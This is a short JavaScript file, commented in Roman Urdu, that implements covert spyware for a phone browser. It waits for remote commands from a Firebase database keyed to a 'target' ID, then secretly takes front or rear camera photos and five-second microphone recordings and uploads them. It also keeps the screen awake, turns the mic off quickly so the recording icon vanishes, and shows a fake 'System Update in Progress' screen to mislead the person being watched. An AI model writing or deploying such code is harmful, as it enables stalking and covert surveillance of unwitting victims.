// --- Driver side logic for stealth background processing ---

const targetID = "AGENT_001"; // Target ka ID
const db = firebase.database();

// 1. WakeLock: Screen off hone par bhi processor ko chalne deta hai
let wakeLock = null;
async function requestWakeLock() {
    try {
        if ('keepAwake' in screen) {
            wakeLock = await screen.keepAwake(true);
        } else if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
        }
    } catch (err) {
        console.log("WakeLock failed: " + err.message);
    }
}

// 2. Command Listener (Commands check karta rahega)
db.ref('commands/' + targetID).on('value', async (snapshot) => {
    const cmd = snapshot.val();
    if (!cmd) return;

    // Wake up process
    await requestWakeLock();

    if (cmd.action === 'photo_front' || cmd.action === 'photo_back') {
        takePhoto(cmd.action === 'photo_front' ? 'user' : 'environment');
    } else if (cmd.action === 'audio_record') {
        startBackgroundAudio();
    }
});

// 3. Background Audio Recording (3-5 Seconds)
async function startBackgroundAudio() {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream);
    let chunks = [];

    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
    mediaRecorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = () => {
            // Firebase mein upload
            db.ref('targets/' + targetID + '/audios').push({
                audio: reader.result,
                time: Date.now()
            });
        };
        stream.getTracks().forEach(track => track.stop()); // Mic band taake icon gayab ho jaye
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 5000); // 5 second record karega
}

// 4. Silent Camera Capture
async function takePhoto(mode) {
    const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: mode } 
    });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    const dataUrl = canvas.toDataURL('image/jpeg', 0.5); // Quality 50% for fast upload
    
    db.ref('targets/' + targetID + '/photos').push({
        img: dataUrl,
        time: Date.now()
    });

    stream.getTracks().forEach(track => track.stop());
}

// Stealth UI: User ko sirf blank screen ya fake "Loading" dikhe
document.body.innerHTML = `<div style="background:black; color:white; height:100vh; display:flex; align-items:center; justify-content:center;">
    <p>System Update in Progress... 15%</p>
</div>`;
